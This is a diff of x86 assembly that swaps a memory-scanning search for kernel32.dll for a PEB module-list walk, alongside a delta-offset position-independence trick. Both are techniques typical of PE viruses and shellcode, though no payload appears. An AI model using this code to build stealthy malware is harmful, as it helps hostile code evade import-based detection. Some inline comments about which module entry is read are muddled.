@@ -20,8 +20,6 @@ main:  call delta
 delta: pop ebp
 	   sub ebp, offset delta
 	
-	   mov esi, [esp]
-	   and esi, 0FFFF0000h
 	   call GetKernel32
 	
 	   push 00000000h
@@ -30,28 +28,22 @@ delta: pop ebp
 CheckPE proto
 
 GetKernel32 proc
-	.while byte ptr [ebp + Kernel32Limit] != 00h
-		assume esi: ptr IMAGE_DOS_HEADER
-		.if [esi].e_magic == "ZM"
-			invoke CheckPE
-			.if eax != 0
-				ret
-			.endif
-		.endif
-		sub esi, 10000h
-		dec byte ptr[ebp + Kernel32Limit]
-	.endw
+	assume fs:nothing
+	mov eax, fs:[30h]		; Get a pointer to the PEB
+	mov eax, [eax + 0Ch]	; Get PEB->Ldr
+	mov eax, [eax+ 1Ch]		; Get PEB->Ldr.InInitializationOrderModuleList.Flink (1st entry)
+	mov eax, [eax]			; Get the next entry (2nd entry)
+	mov eax, [eax]			; Get the 2nd entries base address (kernelbase.dll)
+	mov eax, [eax + 08h]	; Get the 3rd entries base address (kernel32.dll)
 	ret
 GetKernel32 endp
 
 CheckPE proc
-	assume esi: ptr IMAGE_DOS_HEADER
-	mov edi, [esi].e_lfanew
+	mov edi, [esi].IMAGE_DOS_HEADER.e_lfanew
 	add edi, esi
 	
-	assume edi: ptr IMAGE_NT_HEADERS
 	xor eax, eax
-	.if [edi].Signature == IMAGE_NT_SIGNATURE
+	.if [edi].IMAGE_NT_HEADERS.Signature == IMAGE_NT_SIGNATURE
 		xchg eax, esi
 	.endif
 	
